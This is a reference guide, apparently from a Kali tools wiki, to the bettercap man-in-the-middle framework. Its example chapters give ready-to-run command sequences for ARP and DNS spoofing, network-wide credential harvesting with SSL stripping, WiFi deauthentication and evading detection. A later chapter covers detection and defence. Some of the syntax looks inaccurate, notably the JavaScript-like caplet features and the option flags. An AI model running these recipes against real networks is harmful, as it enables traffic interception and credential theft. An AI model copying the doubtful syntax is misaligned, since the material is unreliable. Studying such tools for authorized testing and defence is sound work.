---
title: "bettercap - Swiss Army Knife for Network Attacks and Monitoring"
description: "Modular MITM framework for network reconnaissance, ARP/DNS spoofing, WiFi attacks, and traffic sniffing"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
categories:
  - MITM Framework
  - Network Reconnaissance
  - WiFi Attacks
  - Traffic Interception
tags:
  - mitm
  - arp-spoofing
  - dns-spoofing
  - wifi
  - bluetooth
  - packet-capture
  - go
install_command: "sudo apt install bettercap"
version: "2.32.0"
github_repo: "https://github.com/bettercap/bettercap"
kali_tools_page: "https://www.kali.org/tools/bettercap/"
difficulty_level: intermediate
requires_root: true
gui_available: false
related_tools:
  - mitmproxy
  - arpspoof
  - ettercap
  - wireshark
  - tcpdump
---

# bettercap — Swiss Army Knife for Network Attacks and Monitoring

## Chapter 1: Introduction

### What is bettercap

**bettercap** is a comprehensive man-in-the-middle (MITM) framework written in Go. It provides a modular architecture for network reconnaissance, traffic interception, packet manipulation, and active network attacks. Originally written in Python, it was rewritten in Go for performance, portability, and reduced dependencies.

bettercap consolidates functionality that previously required multiple tools — ARP spoofing, DNS spoofing, packet sniffing, WiFi attacks, BLE reconnaissance, and network probing — into a single, scriptable framework with a powerful interactive console and a caplet-based automation system.

### Historical Context

bettercap evolved from the original Python-based bettercap (created by Simone Margaritelli, aka "evilsocket") which itself was inspired by Ettercap. The Go rewrite (bettercap 2.x) was released in 2018 and represented a fundamental rearchitecture. Key motivations:

- **Performance**: Python's GIL limited concurrent packet processing
- **Dependencies**: Python version conflicts and library requirements
- **Portability**: Single binary distribution
- **Modularity**: Plugin-based architecture with hot-loadable caplets

The tool has become the de facto MITM framework in Kali Linux, replacing Ettercap for most use cases. With 15,000+ GitHub stars, it has a large community and extensive documentation.

### When to Use bettercap

- **Network reconnaissance**: Discover hosts, services, and vulnerabilities on a LAN
- **Credential harvesting**: Intercept HTTP/HTTPS credentials via MITM attacks
- **WiFi auditing**: Test WPA/WPA2 handshakes, deauthentication attacks
- **Bluetooth LE scanning**: Discover and track BLE devices
- **Traffic analysis**: Capture and analyze network traffic in real-time
- **Red team operations**: Conduct authorized network penetration testing
- **Network monitoring**: Passive reconnaissance and traffic analysis

### Core Concepts

- **Caplets**: JavaScript-like scripts that define attack sequences
- **Modules**: Self-contained units of functionality (arp.spoof, dns.spoof, etc.)
- **Events**: Real-time event system for triggering actions
- **Session**: Interactive console with tab completion and history
- **Proxies**: HTTP/HTTPS proxy for traffic interception and modification

---

## Chapter 2: Installation

### System Requirements

| Requirement | Minimum | Recommended |
|------------|---------|-------------|
| OS | Kali Linux 2020+ | Kali Linux 2024+ |
| RAM | 256MB | 1GB+ |
| CPU | Single core | Multi-core |
| Disk | 50MB | 500MB+ |
| Interface | Any NIC | Promiscuous-capable NIC |
| Root | Required | Required |

### Installation Methods

**Method 1: Kali Package Manager (Recommended)**

```bash
sudo apt update
sudo apt install bettercap
```

**Method 2: From Source**

```bash
sudo apt install git golang-go libpcap-dev libnetfilter-queue-dev libusb-1.0-0-dev
git clone https://github.com/bettercap/bettercap.git
cd bettercap
make
sudo cp bettercap /usr/local/bin/
```

**Method 3: Go Install**

```bash
sudo apt install golang-go libpcap-dev libnetfilter-queue-dev
go install github.com/bettercap/bettercap@latest
```

### Post-Installation Verification

```bash
# Verify installation
bettercap --version

# Check available modules
sudo bettercap -eval "help"

# Verify root access
sudo bettercap -eval "exit"
```

### Network Configuration

```bash
# Enable IP forwarding (required for MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# Enable for persistence
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf

# Configure iptables for NAT (if using transparent proxy)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

---

## Chapter 3: Core Concepts

### How bettercap Works

bettercap operates through a modular architecture:

```
[Network Interface] → [Packet Engine] → [Module System] → [Event Bus] → [Session/Output]
```

1. **Packet Engine**: Raw packet capture and injection using libpcap
2. **Module System**: Loadable modules for specific attack/analysis tasks
3. **Event Bus**: Publish-subscribe system for inter-module communication
4. **Session**: Interactive console with command processing
5. **Caplet Engine**: Script execution for automation

### Caplet System

Caplets are bettercap's automation language — JavaScript-like scripts with access to all modules and the event system:

```
# Example caplet: auto_arpspoof.cap
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

### Module Architecture

| Module | Function | Key Options |
|--------|----------|-------------|
| `net.probe` | Active host discovery | `--range` |
| `net.recon` | Passive host reconnaissance | `--sniffer` |
| `arp.spoof` | ARP cache poisoning | `--targets`, `--fullduplex` |
| `dns.spoof` | DNS response spoofing | `--addresses` |
| `net.sniff` | Packet sniffer | `--pcap`, `--filters` |
| `http.proxy` | HTTP/HTTPS proxy | `--address`, `--port` |
| `wifi.recon` | WiFi network discovery | `--channel-hop` |
| `wifi.deauth` | WiFi deauthentication | `--bssid` |
| `ble.recon` | Bluetooth LE scanning | `--device-uuid` |
| `any.proxy` | TCP proxy | `--address`, `--port` |

### Event System

bettercap publishes events for every significant action:

```
# Event types
arp.spoof.new           # New ARP spoofing target
arp.spoof.resolved      # Host MAC resolved
dns.spoof.sent          # DNS spoof response sent
net.sniff.packet        # Packet captured
wifi.recon.new          # New WiFi network discovered
ble.recon.new           # New BLE device discovered
```

---

## Chapter 4: Command Reference

### Basic Syntax

```bash
# Interactive session
sudo bettercap -iface eth0

# Run caplet
sudo bettercap -iface eth0 -caplet myscript.cap

# Execute single command
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.probe off"

# Debug mode
sudo bettercap -iface eth0 -debug -verbose
```

### Core Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-iface` | Network interface | `-iface eth0` |
| `-eval` | Execute commands | `-eval "net.probe on"` |
| `-caplet` | Run caplet file | `-caplet attack.cap` |
| `-proxy` | HTTP proxy port | `-proxy 8080` |
| `-debug` | Enable debug logging | `-debug` |
| `-verbose` | Enable verbose output | `-verbose` |
| `-sniffer` | Enable packet sniffer | `-sniffer` |
| `-pcap` | Write pcap file | `-pcap capture.pcap` |
| `-env` | Load environment file | `-env env.ini` |
| `-no-color` | Disable colored output | `-no-color` |
| `-gateway` | Override gateway IP | `-gateway 192.168.1.1` |

### Interactive Commands

```bash
# Session commands
help                          # List all commands
help <module>                 # Module-specific help
modules                       # List loaded modules
active                        # List active modules

# Module control
net.probe on                  # Enable net discovery
net.probe off                 # Disable net discovery
arp.spoof on                  # Start ARP spoofing
dns.spoof on                  # Start DNS spoofing
net.sniff on                  # Start packet sniffing

# Target management
set arp.spoof.targets 192.168.1.100,192.168.1.101
set arp.spoof.targets 192.168.1.0/24

# Configuration
set http.proxy.address 192.168.1.1
set http.proxy.port 8080
get http.proxy.address

# Event handling
events.clear                  # Clear event log
events.show                   # Show recent events

# Session control
exit                          # Exit bettercap
```

### Module Parameters

**arp.spoof:**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `arp.spoof.fullduplex` | Spoof both directions | false |
| `arp.spoof.targets` | Target IPs | all |
| `arp.spoof.whitelist` | Excluded IPs | none |

**dns.spoof:**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `dns.spoof.address` | Spoofed IP address | interface IP |
| `dns.spoof.domains` | Domains to spoof | all |
| `dns.spoof.all` | Spoof all queries | false |

**net.sniff:**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `net.sniff.verbose` | Show all packets | false |
| `net.sniff.pcap` | Output pcap file | none |
| `net.sniff.filters` | BPF filters | none |

---

## Chapter 5: Examples

### Basic Examples

**Start interactive session:**

```bash
sudo bettercap -iface eth0
```

**Quick host discovery:**

```bash
sudo bettercap -iface eth0 -eval "net.probe on; sleep 15; net.probe off; exit"
```

**Passive reconnaissance:**

```bash
sudo bettercap -iface eth0 -eval "net.recon on; sleep 30; exit"
```

### Intermediate Examples

**ARP spoofing to intercept traffic:**

```bash
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 5;
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;
net.sniff on;
sleep 60;
exit
"
```

**DNS spoofing with caplet:**

```bash
# Create dns_attack.cap
cat > /tmp/dns_attack.cap << 'EOF'
net.probe on
sleep 3
set dns.spoof.address 192.168.1.200
set dns.spoof.all true
dns.spoof on
net.sniff on
EOF

sudo bettercap -iface eth0 -caplet /tmp/dns_attack.cap
```

**HTTP proxy for credential interception:**

```bash
sudo bettercap -iface eth0 -proxy 8080 -eval "
net.probe on;
sleep 5;
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;
http.proxy on;
net.sniff on;
sleep 120;
exit
"
```

### Advanced Examples

**Full network audit caplet:**

```bash
cat > /tmp/network_audit.cap << 'EOF'
# Phase 1: Discovery
net.probe on
sleep 10

# Phase 2: Passive Reconnaissance
net.recon on
sleep 30

# Phase 3: Targeted Sniffing
set net.sniff.verbose true
set net.sniff.pcap /tmp/network_audit.pcap
net.sniff on

# Phase 4: Run for duration
sleep 300

# Phase 5: Cleanup
net.sniff off
net.recon off
net.probe off
exit
EOF

sudo bettercap -iface eth0 -caplet /tmp/network_audit.cap
```

**WiFi recon and deauth:**

```bash
sudo bettercap -iface wlan0mon -eval "
wifi.recon on;
sleep 30;
wifi.deauth <TARGET_BSSID>;
sleep 10;
wifi.deauth off;
wifi.recon off;
exit
"
```

**BLE device tracking:**

```bash
sudo bettercap -eval "
ble.recon on;
sleep 120;
ble.recon off;
exit
" -iface hci0
```

### Real-World Scenarios

**Authorized penetration test — credential harvesting:**

```bash
cat > /tmp/cred_harvest.cap << 'EOF'
# Discovery
net.probe on
sleep 10

# MITM Setup
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# HTTP Proxy for credential capture
set http.proxy.port 8080
http.proxy on

# SSL strip (if applicable)
set https.proxy.port 8443
https.proxy on

# Packet capture
set net.sniff.pcap /tmp/evidence_$(date +%Y%m%d).pcap
net.sniff on

# Monitor for 1 hour
sleep 3600
exit
EOF

sudo bettercap -iface eth0 -caplet /tmp/cred_harvest.cap
```

**Network segmentation test:**

```bash
# Test if VLAN hopping is possible
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 10;
set arp.spoof.targets 192.168.2.0/24;
arp.spoof on;
net.sniff on;
sleep 60;
exit
"
```

---

## Chapter 6: Advanced Usage

### Caplet Development

**Caplet syntax reference:**

```javascript
// Variables
set myvar "value"
get myvar

// Conditionals
if (myvar == "value") {
    // do something
}

// Loops
while (true) {
    // do something
    sleep 5
}

// Functions
function myFunction() {
    // do something
}

// Events
on event:name {
    // handle event
}

// Built-in functions
os.exec("command")
os.mkdir("/path")
json.open("/path/to/file.json")
```

**Example: Dynamic target selection caplet:**

```javascript
// auto_targets.cap - Automatically target active hosts
net.probe on
sleep 10

// Get all discovered hosts
hosts = net.hosts

// Select hosts with specific criteria
for (host in hosts) {
    if (host.vendor =~ /Windows/) {
        set arp.spoof.targets +host.ip
    }
}

arp.spoof on
net.sniff on
```

### Scripting Integration

**Python + bettercap automation:**

```python
#!/usr/bin/env python3
"""automate_bettercap.py - Control bettercap via API"""

import json
import subprocess
import time

def start_bettercap(interface="eth0"):
    """Start bettercap in headless mode with API"""
    cmd = [
        "sudo", "bettercap",
        "-iface", interface,
        "-caplet", "http-ui",  # Enable REST API
        "-eval", "set api.rest true; api.rest on"
    ]
    return subprocess.Popen(cmd)

def send_command(api_url, module, action, params=None):
    """Send command to bettercap API"""
    import requests
    data = {"module": module, "action": action}
    if params:
        data["params"] = params
    requests.post(f"{api_url}/api/session", json=data)

# Usage
proc = start_bettercap("eth0")
time.sleep(5)
send_command("http://127.0.0.1:8081", "arp.spoof", "start",
             {"fullduplex": True, "targets": "192.168.1.100"})
```

### Configuration Tuning

**Performance optimization:**

```bash
# Increase kernel buffers for high-traffic networks
sudo sysctl -w net.core.rmem_max=26214400
sudo sysctl -w net.core.netdev_max_backlog=5000

# Start with optimized settings
sudo bettercap -iface eth0 -eval "
set arp.spoof.timeout 10000;
set net.sniff.pcap true;
net.probe on;
"
```

**Reducing detection footprint:**

```cap
# stealth_scan.cap - Minimize detection
net.probe off          # Don't send probe packets
net.recon on           # Passive only
set arp.spoof.fullduplex false  # One-way spoofing
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

---

## Chapter 7: Detection and Defense

### How bettercap Appears in Logs

**Process artifacts:**

```bash
# Detect bettercap running
ps aux | grep bettercap
pgrep -a bettercap

# Check for bettercap processes
ps -eo pid,ppid,cmd | grep bettercap
```

**Network artifacts:**

```bash
# ARP spoofing creates duplicate MAC entries
arp -a

# Unusual ARP traffic
tcpdump -i eth0 arp -nn

# Detection via vendor OUI lookup
arp -a | grep -i "00:00:00:00:00:00"
```

**Log artifacts:**

```bash
# Check for bettercap log files
find / -name "*.cap" -o -name "bettercap*" 2>/dev/null

# Check for caplet files
find /tmp -name "*.cap" 2>/dev/null
```

### Defensive Monitoring

**ARP spoof detection:**

```bash
#!/bin/bash
# detect_arp_spoof.sh
GATEWAY_IP="192.168.1.1"
GATEWAY_MAC=$(arp -n | grep "$GATEWAY_IP" | awk '{print $3}')

while true; do
    CURRENT_MAC=$(arp -n | grep "$GATEWAY_IP" | awk '{print $3}')
    if [ "$CURRENT_MAC" != "$GATEWAY_MAC" ]; then
        echo "[!] ARP Spoof Detected! Gateway MAC changed!"
        echo "    Expected: $GATEWAY_MAC"
        echo "    Current:  $CURRENT_MAC"
        # Alert or take action
    fi
    sleep 5
done
```

**Static ARP entries (prevention):**

```bash
# Set static ARP entry for gateway
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# Make persistent via /etc/ethers
echo "192.168.1.1 00:11:22:33:44:55" | sudo tee -a /etc/ethers
```

### Evasion Considerations

bettercap can be detected through:

- **ARP anomaly detection**: IDS monitoring for ARP storms
- **Certificate pinning**: Prevents SSL stripping
- **802.1X**: Network access control prevents MITM
- **Encrypted DNS**: DoH/DoT prevents DNS spoofing
- **VPN usage**: Encrypted tunnels bypass local MITM

---

## Chapter 8: Troubleshooting and FAQ

### Common Issues

**"Operation not permitted" error:**

```bash
# Problem: Insufficient privileges
# Solution: Run with sudo
sudo bettercap -iface eth0
```

**Interface not found:**

```bash
# Problem: Interface name incorrect or not available
# Diagnosis
ip link show
iwconfig

# Solution: Use correct interface name
sudo bettercap -iface wlan0mon  # For monitor mode WiFi
```

**ARP spoofing not working:**

```bash
# Problem: Target not responding
# Diagnosis
arp -a
ping 192.168.1.100

# Solution: Ensure target is on same subnet and IP forwarding is enabled
sudo sysctl -w net.ipv4.ip_forward=1
```

**No HTTPS traffic intercepted:**

```bash
# Problem: HSTS or certificate pinning
# Solution: Use SSLstrip2 or configure HTTPS proxy
sudo bettercap -iface eth0 -eval "
set https.proxy.port 8443;
https.proxy on;
arp.spoof on;
"
```

### FAQ

**Q: Is bettercap legal to use?**
A: bettercap is a legitimate security tool. Using it on networks you don't own or have authorization to test is illegal. Always obtain written authorization before testing.

**Q: Can bettercap bypass HTTPS?**
A: bettercap can perform SSL stripping on HTTP-to-HTTPS redirects, but cannot break strong TLS encryption. Certificate pinning and HSTS prevent most MITM attacks.

**Q: Does bettercap work on WiFi?**
A: Yes. bettercap supports WiFi attacks including recon, deauth, and WPA handshake capture. Requires a compatible wireless adapter in monitor mode.

**Q: How does bettercap differ from Ettercap?**
A: bettercap is written in Go (faster, single binary), has a modular architecture, supports WiFi/BLE, and has a more active development community. Ettercap is older and less maintained.

**Q: Can bettercap be scripted?**
A: Yes. Caplets provide a JavaScript-like scripting language. bettercap also has a REST API for external control.

---

## Resources

- **Official Documentation**: https://www.bettercap.org/
- **GitHub Repository**: https://github.com/bettercap/bettercap
- **Kali Tools Page**: https://www.kali.org/tools/bettercap/
- **Caplet Examples**: https://github.com/bettercap/caplets
- **Related Tools**: mitmproxy, arpspoof, ettercap, wireshark, tcpdump
- **MITRE ATT&CK**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
- **Community**: https://www.bettercap.org/docs/
